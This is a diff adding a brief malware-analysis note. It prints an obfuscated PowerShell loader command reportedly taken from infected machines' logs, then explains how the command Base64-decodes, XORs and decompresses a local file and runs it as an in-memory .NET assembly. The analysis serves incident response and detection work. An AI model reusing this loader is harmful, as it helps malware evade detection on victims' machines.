@@ -1,0 +1,9 @@
+cmd.exe /c "powershell -c "function cSUex($kGFsz){$SjAZa=New-Object System.IO.MemoryStream(,$kGFsz);$zIanR=New-Object System.IO.MemoryStream;$vRvnd=New-Object System.IO.Compression.GZipStream($SjAZa,[IO.Compression.CompressionMode]::Decompress);$hRgEv = New-Object System.IO.BinaryWriter($zIanR);$bRTaW = New-Object byte[](1024);while($true){$FgteA = $vRvnd.Read($bRTaW,0,1024);if($FgteA -le 0){break;}$hRgEv.Write($bRTaW,0,$FgteA);$hRgEv.Flush();}$vRvnd.Dispose();$SjAZa.Dispose();$hRgEv.Close();$zIanR.Dispose();$zIanR.ToArray();} function JeGso($kGFsz){$PzChi=[System.Convert]::FromBase64String('hkguTzSCb75g7sJ9ChMcmAOPpeBL9ZJy/tejnoCjT+E=');For ($i=0; $i -lt $kGFsz.Length; $i++) {$ix = $i % $PzChi.Length;$kGFsz[$i] = $kGFsz[$i] -bxor $PzChi[$ix];}$kGFsz;} $hqVAs=cSUex(JeGso([System.Convert]::FromBase64String([System.IO.File]::ReadAllText('C:\ProgramData\im10051.json'))));$ass = [System.Reflection.Assembly]::Load([byte[]]$hqVAs);$en=$ass.EntryPoint;$en.Invoke($null,$null);""
+
+The above command was extracted from the logs of the infected machines. And following is what it does:
+  Runs PowerShell from cmd.exe and defines two helper functions inside that PowerShell call.
+  Reads the text contents of C:\ProgramData\im10051.json.
+  Treats that file as Base64, decodes it to bytes, then XORs each byte with a repeating key (the key is the Base64 string hkguTzSCb75g7sJ9ChMcmAOPpeBL9ZJy/tejnoCjT+E=).
+  Passes the XOR-decoded bytes into a function that decompresses GZip from a memory stream.
+  Loads the resulting bytes as a .NET assembly in memory ([System.Reflection.Assembly]::Load(...)).
+  Invokes the assembly’s entry point, i.e., executes code from that loaded assembly — all in-memory (no obvious write-back to disk).
